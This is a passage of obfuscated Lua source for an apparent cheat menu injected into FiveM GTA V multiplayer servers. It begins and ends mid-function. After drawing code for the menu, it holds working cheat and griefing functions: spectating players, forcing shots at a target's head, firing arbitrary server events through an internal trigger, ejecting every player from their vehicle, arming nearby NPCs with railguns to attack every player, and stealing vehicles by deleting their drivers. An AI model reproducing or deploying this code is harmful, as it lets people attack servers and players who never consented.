			sliderColorText = {r = _menuColor.base.r + 20, g = _menuColor.base.g + 20, b = _menuColor.base.b + 20, a = 255}
		end

		local sliderOverlayWidth = sliderWidth / (itemsCount - 1)
		
		-- Button
		QcLQRmNAPn(x, y, menuWidth, buttonHeight, backgroundColor) -- Button Rectangle -2.15

		-- Button text
		MCsXXBhWJK(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

		
		-- Slider left
        QcLQRmNAPn(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y, sliderWidth, sliderHeight, sliderColorBase)
		-- Slider right
		QcLQRmNAPn(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - (sliderOverlayWidth / 2) * (itemsCount - selectedIndex), y, sliderOverlayWidth * (itemsCount - selectedIndex), sliderHeight, menus[currentMenu].buttonSubBackgroundColor)
		-- Slider knob
		QcLQRmNAPn(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1)), y, knobWidth, knobHeight, sliderColorKnob)

		-- Slider value text
		MCsXXBhWJK(items[selectedIndex], x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y + separatorHeight / 2 - (buttonHeight / 2 - sliderFontHeight / 2), buttonFont, sliderColorText, sliderFontScale, true, shadow) -- Current Item Text
	end
end

function fjustimenUI.RugSAmWXJf(text, items, itemsCount, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		WccwteMAhz(text, items, itemsCount, selectedIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function fjustimenUI.NgPSWlTpNm(text, id)
	if menus[id] then
		if fjustimenUI.GwGoBeHRde(text, "isMenu") then
			vKuBqBMrNu(id, true)
			return true
		end
	end

	return false
end

function fjustimenUI.GaNIUyizUH(text, bool, callback)
	local checked = "toggleOff"
	if bool then
		checked = "toggleOn"
	end

	if fjustimenUI.GwGoBeHRde(text, checked) then
		bool = not bool

		if callback then callback(bool) end

		return true
	end

	return false
end

function fjustimenUI.aoWvmXaXou(text, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		FQjuNjGJRY(text, selectedIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function fjustimenUI.ComboBox(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 1
		selectedItem = items[selectedIndex]
	end


	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if fjustimenUI.aoWvmXaXou(text, selectedItem) then
		callback(selectedIndex, selectedItem)
		return true
	end

	if isCurrent then
		if currentKey == keys.left then
			if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
			if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end

	callback(selectedIndex, selectedItem)

	return false
end

local DrawPlayerInfo = {
	pedHeadshot = false,
	txd = "null",
	handle = nil,
	currentPlayer = -1,
}

function fjustimenUI.LWmTkinCNg(player)
	-- Handles running code only once per user. Will run once per `SelectedPlayer` change
	if DrawPlayerInfo.currentPlayer ~= player then

		-- Current player selected
		DrawPlayerInfo.currentPlayer = player

		-- Drawing coordinates
		DrawPlayerInfo.mugshotWidth = buttonHeight / aspectRatio
		DrawPlayerInfo.mugshotHeight = DrawPlayerInfo.mugshotWidth * aspectRatio
		DrawPlayerInfo.x = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2 
		DrawPlayerInfo.y = menus[currentMenu].y + titleHeight
		
		-- Player init
		DrawPlayerInfo.playerPed = GetPlayerPed(DrawPlayerInfo.currentPlayer)
		DrawPlayerInfo.playerName = fjustimen:CheckName(GetPlayerName(DrawPlayerInfo.currentPlayer))


		local function RegisterPedHandle()
			
			if DrawPlayerInfo.handle and IsPedheadshotValid(DrawPlayerInfo.handle) then
		
				DrawPlayerInfo.pedHeadshot = false
				UnregisterPedheadshot(DrawPlayerInfo.handle)
				DrawPlayerInfo.handle = nil
				DrawPlayerInfo.txd = "null"
		
			end
		
			-- Get the ped headshot image.
			DrawPlayerInfo.handle = RegisterPedheadshot(DrawPlayerInfo.playerPed)
		
			while not IsPedheadshotReady(DrawPlayerInfo.handle) or not IsPedheadshotValid(DrawPlayerInfo.handle) do
				Wait(50)
			end
			
			if IsPedheadshotReady(DrawPlayerInfo.handle) and IsPedheadshotValid(DrawPlayerInfo.handle) then
				DrawPlayerInfo.txd = GetPedheadshotTxdString(DrawPlayerInfo.handle)
				DrawPlayerInfo.pedHeadshot = true
			else
				DrawPlayerInfo.pedHeadshot = false
			end
		end
		LUtjuLMzHY(RegisterPedHandle)
	end
	
	-- Pull coordinates from client (self)
	local client = GetEntityCoords(PlayerPedId())
	local cx, cy, cz = client[1], client[2], client[3]
	-- Pull coordinates from target (player)
	local target = GetEntityCoords(DrawPlayerInfo.playerPed)
	local tx, ty, tz = target[1], target[2], target[3]
	
	-- infoBox = {
	-- 	tostring("Name: " .. fjustimen:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. fjustimen.Game:GetPedStatus(dataPed)),
	-- }

	-- [ NOTE ] refactor infoData into DrawPlayerInfo

	-- Define our infoData table
	local infoData = {}

	-- Get the vehicle model name instead of the label text to support custom vehicles
	local vehicleName = GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(DrawPlayerInfo.playerPed)))
	
	-- Should work, but my local server isn't using MP peds, so I need to test once exec is updated.
	-- using `playerPed` instead of `player` for now
	-- playerHealth = GetEntityHealth(DrawPlayerInfo.playerPed) - 100

	-- Update player armour every draw
	local playerArmour = GetPedArmour(DrawPlayerInfo.playerPed)

	-- Update player distance every draw
	local playerDistance = math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)

	-- Player IDs
	infoData[1] = {}
	infoData[1][1] = "Server / Local"
	infoData[1][2] = ("~b~%3d ~s~/~p~ %-3d"):format(GetPlayerServerId(DrawPlayerInfo.currentPlayer), DrawPlayerInfo.currentPlayer)

	-- Player Vehicle
	infoData[2] = {}
	infoData[2][1] = "Vehicle"
	infoData[2][2] = vehicleName == "CARNOTFOUND" and "~r~NONE" or vehicleName
	
	-- Player Health
	infoData[3] = {}
	infoData[3][1] = "Health"
	infoData[3][2] = IsPedDeadOrDying(DrawPlayerInfo.playerPed, 1) and "~r~DEAD" or playerHealth

	-- Player Armour
	infoData[4] = {}
	infoData[4][1] = "Armour"
	infoData[4][2] = playerArmour

	-- Player Distance
	infoData[5] = {}
	infoData[5][1] = "Distance"
	infoData[5][2] = playerDistance
	
	-- local infoData = {
	-- 	tostring("Name: " .. fjustimen:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. vehicleName),
	-- }

	
	-- QcLQRmNAPn(DrawPlayerInfo.x, DrawPlayerInfo.y + footerHeight / 2, previewWidth, footerHeight, { r = 0, b = 0, g = 0, a = 255 })
	
	-- Header box
	QcLQRmNAPn(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, previewWidth, DrawPlayerInfo.mugshotHeight, { r = 0, g = 0, b = 0, a = 255 })
	MCsXXBhWJK(DrawPlayerInfo.playerName, DrawPlayerInfo.x + DrawPlayerInfo.mugshotWidth + buttonTextXOffset / 2 - previewWidth / 2, DrawPlayerInfo.y - separatorHeight + (buttonHeight / 2 - fontHeight / 2), buttonFont, _menuColor.base, buttonScale, false, false)
	
	-- Ped preview
	if DrawPlayerInfo.pedHeadshot == true and IsPedheadshotValid(DrawPlayerInfo.handle) and IsPedheadshotReady(DrawPlayerInfo.handle) then
		DrawSprite(DrawPlayerInfo.txd, DrawPlayerInfo.txd, DrawPlayerInfo.x - previewWidth / 2 + DrawPlayerInfo.mugshotWidth / 2, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, DrawPlayerInfo.mugshotWidth, DrawPlayerInfo.mugshotHeight, 0.0, 255, 255, 255, 255)
	end
	
	-- Separator
	QcLQRmNAPn(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight + separatorHeight / 2, previewWidth, separatorHeight, _menuColor.base)
	
	-- Content
	for i = 1, #infoData do
		local multiplier = i
		local text = infoData[i]
		-- Draw content background
		QcLQRmNAPn(DrawPlayerInfo.x, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * multiplier - footerHeight / 2, previewWidth, footerHeight, menus[currentMenu].menuBackgroundColor)
		-- Draw info title (left)
		MCsXXBhWJK(text[1], DrawPlayerInfo.x - previewWidth / 2 + buttonTextXOffset / 2, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false)
		-- Draw info description (right)
		cdRAXXKqAQ(tostring(text[2]), DrawPlayerInfo.x + buttonTextXOffset, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false, true)
		
	end

end

function fjustimenUI.OWvsPvaGDV(index)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	
	if index then
		RequestStreamedTextureDict(t_Weapons[index][4])
		if HasStreamedTextureDictLoaded(t_Weapons[index][4]) then
			QcLQRmNAPn((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			xsgkNwXpxT(t_Weapons[index][4], t_Weapons[index][3], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end

end

function fjustimenUI.TsMRJQiFYw(vehClass)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	local class = VehicleClass[vehClass]
	local index = menus[currentMenu].currentOption
	
	if class and index then
		RequestStreamedTextureDict(class[index][2])
		if HasStreamedTextureDictLoaded(class[index][2]) then
			QcLQRmNAPn((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			xsgkNwXpxT(class[index][2], class[index][3] or class[index][1], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end
end

function fjustimenUI.pyCDRpSJBU()
	if bTaXXysBSa(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			fjustimenUI.BAmKCdiWiG()
		else
			SetScriptGfxDrawOrder(15)
			-- wdQwAfAMhU()
			TnZOUQgMVa()
			IgJGMmbgGn()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					vKuBqBMrNu(menus[currentMenu].previousMenu, true, true)
				else
					fjustimenUI.BAmKCdiWiG()
				end
			end

			optionCount = 0
		end
	end
end

function fjustimenUI.WrchqLWoKG(id, width)
	UtxwxNTRfj(id, "width", width)
end

function fjustimenUI.FkAveYuLcz(id, x)
	UtxwxNTRfj(id, "x", x)
end

function fjustimenUI.cLqfoNGUlC(id, y)
	UtxwxNTRfj(id, "y", y)
end

function fjustimenUI.lWrhQtIdLd(id, count)
	UtxwxNTRfj(id, "maxOptionCount", count)
end

function fjustimenUI.NljlVGABUy(id, r, g, b, a)
	UtxwxNTRfj(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function fjustimenUI.kcUDSqnkav(id, r, g, b, a)
	UtxwxNTRfj(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function fjustimenUI.eXveKxjLvv(id, textureDict, textureName)
	UtxwxNTRfj(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function fjustimenUI.iDNuClwTMv(id, text)
	UtxwxNTRfj(id, "subTitle", string.upper(text))
end

function fjustimenUI.NCQJqISUdB(id, r, g, b, a)
	UtxwxNTRfj(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function fjustimenUI.QmfajGEwXQ(id, r, g, b, a)
	UtxwxNTRfj(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function fjustimenUI.DUfHHkEQET(id, r, g, b, a)
	UtxwxNTRfj(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function fjustimenUI.TyZuhWrrkL(id, r, g, b, a)
	UtxwxNTRfj(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function fjustimenUI.fLRKDqoFID(id, name, set)
	UtxwxNTRfj(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

local function sWzmwexFNb(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

local function qWjWzsoMZz(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function JlwHvSDJgT(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function liiUZlzltw()
	local WaypointHandle = GetFirstBlipInfoId(8)

  	if DoesBlipExist(WaypointHandle) then
  		local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)
		for height = 1, 1000 do
			SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

			local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			if foundGround then
				SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

				break
			end

			Citizen.Wait(0)
		end
	else
		fjustimenUI.SendNotification({text = "You must place a waypoint", type = 'error'})
	end
end

local function lgwgqOpcaw(selectedPlayer)
	local selectedPlayerPed = GetPlayerPed(selectedPlayer)
	
	if fjustimen.Player.Spectating then

		RequestCollisionAtCoord(GetEntityCoords(PlayerPedId()))

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		NetworkSetInSpectatorMode(false, 0)
		SetMinimapInSpectatorMode(false, 0)

		ClearPedTasks(PlayerPedId())
		DoScreenFadeIn(500)

	else

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		RequestCollisionAtCoord(GetEntityCoords(selectedPlayerPed))

		NetworkSetInSpectatorMode(false, 0)
		NetworkSetInSpectatorMode(true, selectedPlayerPed)
		SetMinimapInSpectatorMode(true, selectedPlayerPed)

		TaskWanderStandard(PlayerPedId(), 0, 0)
		DoScreenFadeIn(500)
		
	end

	fjustimen.Player.Spectating = not fjustimen.Player.Spectating
end

function EfPWELDSBC(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

local function oTZVOqVILa(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			break
		end
	end
end


--------------------------------------------------------------------------------RUFANA FUNCTIONS ADDONS-------------------------------------------------------------------------------------------------------

LbmafInBBs=function(is_server,event,...)
	local args=msgpack.pack({...})
	if is_server then
		TriggerServerEventInternal(event,args,args:len())
	else
		TriggerEventInternal(event,args,args:len())
	end
end

TlEinQlrUD = {}
TlEinQlrUD.respawnPed = function(i8CKVc, wPHjsIoyC9, iCQfY4n)
    SetEntityCoordsNoOffset(i8CKVc, wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, false, false, false, true)
    NetworkResurrectLocalPlayer(wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, iCQfY4n, true, false)
    SetPlayerInvincible(i8CKVc, false)
    LbmafInBBs(false, "playerSpawned", wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z)
    ClearPedBloodDamage(i8CKVc)
end
TlEinQlrUD.nativeRevive = function()
    local zLXwr6t9ybAtDp = GetEntityCoords(PlayerPedId())
    local sKquZDsjk7h0GINR = {
        x = TlEinQlrUD.Math.Round(zLXwr6t9ybAtDp.x, 1),
        y = TlEinQlrUD.Math.Round(zLXwr6t9ybAtDp.y, 1),
        z = TlEinQlrUD.Math.Round(zLXwr6t9ybAtDp.z, 1)
    }
    TlEinQlrUD.respawnPed(PlayerPedId(), sKquZDsjk7h0GINR, 0)
    StopScreenEffect("DeathFailOut")
    fjustimenUI.SendNotification({text = "Revived!", type = "success"})
end

local function TTyxnNvbyQ(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function CqljTYSTQB()
    local plist = GetActivePlayers()
    for i = 0, #plist do
        TTyxnNvbyQ(i)
    end
end

-- Thanks to Fallen#0811 for the idea
local function LOgtuivgXj(target)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
	for k in DHJCIbSbgi() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
			GiveWeaponToPed(k, GetHashKey("WEAPON_RAILGUN"), 9999, 0, 1) 
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end

local function OuDoFDlHgS()
    local plist = GetActivePlayers()
    for i = 0, #plist do
        LOgtuivgXj(i)
    end
end

TlEinQlrUD.aWxBYGYMOL = function()
    ClearAllBrokenGlass()
    ClearAllHelpMessages()
    LeaderboardsReadClearAll()
    ClearBrief()
    ClearGpsFlags()
    ClearPrints()
    ClearSmallPrints()
    ClearReplayStats()
    LeaderboardsClearCacheData()
    ClearFocus()
    ClearHdArea()
    ClearPedBloodDamage(PlayerPedId())
    ClearPedWetness(PlayerPedId())
    ClearPedEnvDirt(PlayerPedId())
    ResetPedVisibleDamage(PlayerPedId())
end

TlEinQlrUD.LNhEwrxqhF = function ()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, true)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        fjustimenUI.SendNotification({text = "Searching for vehicle!", type = 'success'})
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
			fjustimenUI.SendNotification({text = "Vehicle found!", type = 'success'})
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
          end
          fjustimenUI.SendNotification({text = "Teleported Into Nearest Vehicle!", type = 'success'})
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
		  end
		  fjustimenUI.SendNotification({text = "Teleported Into Nearest Vehicle!", type = 'success'})
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, false)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, false)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
		  end
		  fjustimenUI.SendNotification({text = "Teleported Into Nearest Vehicle!", type = 'success'})
        end
end

TlEinQlrUD.QsIDnVhZJH = function ()
local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
		--drawNotification("~r~You Aren't Sitting In A Vehicle Bruh!")
		print("jd")
    else
				SetVehicleUndriveable(veh,false)
				SetVehicleEngineHealth(veh, 1000.0)
				SetVehiclePetrolTankHealth(veh, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
				SetVehicleEngineOn(veh, true, false )
				SetVehicleOilLevel(veh, 1000.0)
	end
end

TlEinQlrUD.ypmedWFxln = function()
    --[[local camion = "volatol"
    local avion = "avenger"
    local avion2 = "tula"
    local heli = "bombushka"
    local random = "blimp3"
    local addon1 = "tug"
    local addon2 = "marquis"
	local addon3 = "cerberus3"
	local addon4 = "avenger2"
	local addon5 = "luxor2"
	local addon6 = "miljet"
	local addon7 = "rogue"
	local addon8 = "freight"
	local addon9 = "freightcont1"
	local addon10 = "tanker"
	local addon11 = "tanker2"
	local addon12 = "titan"
	local addon13 = "brickade"
	local addon14 = "pbus2"
	local addon15 = "tankercar"
	local addon16 = "freightcont1"
	local addon17 = "freightcont2"
	local addon18 = "freight"
	local addon19 = "trailerlogs"
	local addon20 = "trailerlarge"
	local addon21 = "tr2"
	local addon22 = "tr3"
	local addon23 = "tr4"
	local addon24 = "armytrailer2"
	local addon25 = "baletrailer"
	local addon26 = "tiptruck2"
	local addon27 = "mixer"
	local addon28 = "rubble"
	local addon29 = "cutter"]]

    Citizen.CreateThread(function()
		local dg="volatol"
		local dh="avenger"
		local di="tula"
		local dj="bombushka"
		local dk="tug"
		
		while not HasModelLoaded(GetHashKey(dh))do 
			Citizen.Wait(0)
			RequestModel(GetHashKey(dh))
		end
		
		while not HasModelLoaded(GetHashKey(di))do
			Citizen.Wait(0)RequestModel(GetHashKey(di))
		end
			
		while not HasModelLoaded(GetHashKey(dg))do 
			Citizen.Wait(0)RequestModel(GetHashKey(dg))
		end
			
		while not HasModelLoaded(GetHashKey(dj))do 
			Citizen.Wait(0)RequestModel(GetHashKey(dj))
		end
		
		while not HasModelLoaded(GetHashKey(dk))do 
			Citizen.Wait(0)RequestModel(GetHashKey(dk))
		end
		
		for i=0,128 do 
